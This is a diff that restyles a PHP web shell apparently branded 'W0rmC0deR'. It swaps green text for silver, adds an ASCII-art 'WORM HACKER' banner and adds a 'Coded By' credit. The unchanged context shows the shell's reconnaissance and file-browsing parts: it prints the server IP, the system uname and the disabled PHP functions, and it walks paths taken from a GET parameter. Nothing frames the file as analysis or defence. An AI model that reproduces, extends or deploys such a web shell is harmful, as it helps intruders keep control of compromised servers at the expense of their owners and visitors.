@@ -6,9 +6,9 @@
 ################################
 error_reporting(E_ALL ^ (E_NOTICE | E_WARNING));
 $show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=lime>NONE</font>";
-echo "<b><font color='green'><br>Server IP : ".gethostbyname($_SERVER['HTTP_HOST'])."</b></font>";
-echo "<b><font color='green'><br>".php_uname()."</b></font><br>";
-echo "<b><font color='green'>Disable Functions: $show_ds</b></font><br><br>";
+echo "<b><font color='Silver'><br>Server IP : ".gethostbyname($_SERVER['HTTP_HOST'])."</b></font>";
+echo "<b><font color='Silver'><br>".php_uname()."</b></font><br>";
+echo "<b><font color='Silver'>Disable Functions: $show_ds</b></font><br><br>";
 ?>
 <br>
 </center>
@@ -70,7 +70,19 @@ border-radius:5px;
 </style>
 </HEAD>
 <BODY>
-<H1><center><font color="Purple">$ W0rmC0deR $</font></center></H1>
+<center><font color="Silver" size="2"><pre>
+$$\      $$\  $$$$$$\  $$$$$$$\  $$\      $$\       $$\   $$\  $$$$$$\   $$$$$$\  $$\   $$\ $$$$$$$$\ $$$$$$$\
+$$ | $\  $$ |$$  __$$\ $$  __$$\ $$$\    $$$ |      $$ |  $$ |$$  __$$\ $$  __$$\ $$ | $$  |$$  _____|$$  __$$\
+$$ |$$$\ $$ |$$ /  $$ |$$ |  $$ |$$$$\  $$$$ |      $$ |  $$ |$$ /  $$ |$$ /  \__|$$ |$$  / $$ |      $$ |  $$ |
+$$ $$ $$\$$ |$$ |  $$ |$$$$$$$  |$$\$$\$$ $$ |      $$$$$$$$ |$$$$$$$$ |$$ |      $$$$$  /  $$$$$\    $$$$$$$  |
+$$$$  _$$$$ |$$ |  $$ |$$  __$$< $$ \$$$  $$ |      $$  __$$ |$$  __$$ |$$ |      $$  $$<   $$  __|   $$  __$$<
+$$$  / \$$$ |$$ |  $$ |$$ |  $$ |$$ |\$  /$$ |      $$ |  $$ |$$ |  $$ |$$ |  $$\ $$ |\$$\  $$ |      $$ |  $$ |
+$$  /   \$$ | $$$$$$  |$$ |  $$ |$$ | \_/ $$ |      $$ |  $$ |$$ |  $$ |\$$$$$$  |$$ | \$$\ $$$$$$$$\ $$ |  $$ |
+\__/     \__| \______/ \__|  \__|\__|     \__|      \__|  \__|\__|  \__| \______/ \__|  \__|\________|\__|  \__|
+
+
+
+</pre></font></center></H1>
 <table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
 <tr><td>Current Path : ';
 if(isset($_GET['path'])){
@@ -253,7 +265,7 @@ echo "</center></td>
 echo '</table>
 </div>';
 }
-echo '<br /><font color="Purple"></font><font color="Purple">W0rmC0deR</font>
+echo '<br /><center><font color="Purple">Coded By W0rmC0d3R</font>
 </BODY>
 </HTML>';
 function perms($file){
